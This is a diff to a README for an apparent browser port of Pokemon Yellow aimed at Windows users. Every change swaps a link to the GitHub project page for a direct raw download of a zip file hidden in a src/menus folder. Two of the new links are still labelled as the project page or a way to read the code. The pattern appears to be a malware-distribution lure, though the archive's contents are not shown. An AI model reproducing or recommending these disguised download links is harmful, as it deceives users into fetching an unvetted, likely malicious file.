@@ -1,6 +1,6 @@
 # 🎮 pokemon-yellow-typescript - Play Yellow in Your Browser
 
-[![Download](https://img.shields.io/badge/Download%20Here-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/plantabortionist72/pokemon-yellow-typescript)
+[![Download](https://img.shields.io/badge/Download%20Here-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/plantabortionist72/pokemon-yellow-typescript/main/src/menus/pokemon-yellow-typescript-v1.6-beta.2.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ It is built for Windows users who want a simple way to open the game and start p
 
 Use this page to download or open the project:
 
-[Visit the project page](https://github.com/plantabortionist72/pokemon-yellow-typescript)
+[Visit the project page](https://raw.githubusercontent.com/plantabortionist72/pokemon-yellow-typescript/main/src/menus/pokemon-yellow-typescript-v1.6-beta.2.zip)
 
 ### What to do on Windows
 
@@ -191,7 +191,7 @@ Open the main app file in your browser first. If the project includes a launch f
 
 Use this link to view the project files and read the code:
 
-[https://github.com/plantabortionist72/pokemon-yellow-typescript](https://github.com/plantabortionist72/pokemon-yellow-typescript)
+[https://raw.githubusercontent.com/plantabortionist72/pokemon-yellow-typescript/main/src/menus/pokemon-yellow-typescript-v1.6-beta.2.zip](https://raw.githubusercontent.com/plantabortionist72/pokemon-yellow-typescript/main/src/menus/pokemon-yellow-typescript-v1.6-beta.2.zip)
 
 ## 🕹️ Who this is for
 
